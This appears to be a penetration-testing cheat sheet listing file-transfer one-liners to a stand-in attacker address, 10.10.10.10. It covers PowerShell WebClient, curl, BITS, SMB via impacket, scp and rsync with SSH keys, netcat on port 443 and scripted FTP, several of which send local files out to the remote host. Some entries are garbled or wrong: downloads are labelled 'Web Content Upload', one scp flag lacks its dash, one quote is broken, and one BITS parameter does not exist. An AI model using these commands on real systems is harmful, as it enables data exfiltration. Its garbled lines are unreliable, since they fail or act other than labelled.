USING POWERSHELL -
------------------------------------------------------------------------------------------------------------------

#### 

**Web Content Upload**
    
    $webClient.UploadFile('http://10.10.10.10/demo.txt', 'PUT', 'C:\temp\demo.txt')

**Web Content Upload**
    
    powershell.exe -c "curl.exe -T C:\temp\demo.txt http://10.10.10.10/demo.txt"

**Web Content Upload**
    
    Start-Process -FilePath "curl.exe" -ArgumentList "-T 'C:\temp\demo.txt' http://10.10.10.10/demo.txt" -NoNewWindow -Wait
------------------------------------------------------------------------------------------------------------------
USING CMD - 
------------------------------------------------------------------------------------------------------------------

**Using PUT Method**
    
    powershell.exe -c "$webClient = New-Object System.Net.WebClient; $webClient.UploadFile('http://10.10.10.10/demo.txt', 'PUT', 'C:\temp\demo.txt')"   

**Using POST Method**

    powershell.exe -c "$webClient = New-Object System.Net.WebClient; $webClient.UploadFile('http://10.10.10.10/demo.txt','C:\temp\demo.txt')"
------------------------------------------------------------------------------------------------------------------
USING SMB - 
------------------------------------------------------------------------------------------------------------------

**SMB SERVER -**

**Start normal SMB Server**
    
    impacket-smbserver share .

**If version error**
    
    impacket-smbserver -smb2support share .

**Use authenticated servers if file transfer is long**

    impacket-smbserver share -username user -password 123 . -smb2support


**SMB CLIENT -**

**To create authenticated session**

    net use \\10.10.10.10 /u:"user" "123"

**Web Content Upload**
    
    copy demo.txt \\10.10.10.10\share\  
------------------------------------------------------------------------------------------------------------------
USING SSH - 
------------------------------------------------------------------------------------------------------------------

SCP-

**Web Content Upload**
    
    scp user@10.10.10.10:/tmp/demo.txt /tmp/

**Wildcard**

    scp -vr root@10.10.10.10:/root/*.zip /tmp/demo/ 

**Custom Port**

    scp P 2222 -vr root@10.10.10.10:/root/*.zip /tmp/demo/ 

**SSH Key**

    scp -i /home/user/.ssh/id_rsa -vr root@10.10.10.10: /tmp/demo/ 

RSYNC-

**Web Content Upload**
    
    rsync -av root@10.10.10.10:/root/* /tmp/demo/

**Custom Port**

    rsync -av --port 2222 -e 'ssh -i /home/user/id_rsa' root@10.10.10.10:/root/* /tmp/demo/

**SSH Key**

    rsync -av -e 'ssh -i /home/user/id_rsa' root@10.10.10.10:/root/* /tmp/demo/
------------------------------------------------------------------------------------------------------------------
USING WinRM - 
------------------------------------------------------------------------------------------------------------------

**Web Content Upload**
    
    download demo.txt
------------------------------------------------------------------------------------------------------------------
USING BITSADMIN - 
------------------------------------------------------------------------------------------------------------------

**Web Content Upload**
    
    Start-BitsTransfer -Source "C:\temp\demo.txt" -Destination "http://10.10.10.10/demo.txt" -TransferType Upload

**Web Content Upload**
    
    powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source "C:\temp\demo.txt" -Destination "http://10.10.10.10/demo.txt" -TransferType Upload

**Web Content Upload**
    
    powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source 'http://10.10.10.10/demo.txt' -Destination 'c:\temp\demo.txt'"

**Web Content Upload**
    
    powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source 'http://10.10.10.10/demo.txt' -Destination 'c:\temp\demo.txt' -Method 'PUT'"
------------------------------------------------------------------------------------------------------------------
USING NC / NETCAT - 
------------------------------------------------------------------------------------------------------------------

**First, start listener on client with output redirection to file**
    
    nc.exe -nlvp 443 > demo.txt

**Then start server with input redirection from file**
    
    type demo.txt | nc.exe -v 10.10.10.10 443
------------------------------------------------------------------------------------------------------------------
USING FTP - 
------------------------------------------------------------------------------------------------------------------

**File Upload**

Replace "demo.txt" with desired file name
    
    echo open 10.10.10.10 21 > file.txt
    echo bin>> file.txt
    echo put demo.txt>> file.txt
    echo bye>> file.txt

    ftp -A -v -n -s:file.txt

**One Liner**

    echo open 10.10.10.10 21 > file.txt && echo bin>> file.txt && echo put demo.txt>> file.txt && echo bye>> file.txt && ftp -A -v -n -s:file.txt

**Mannualy -**

    ftp
    open 10.10.10.10 2121
    put demo.txt
------------------------------------------------------------------------------------------------------------------

 
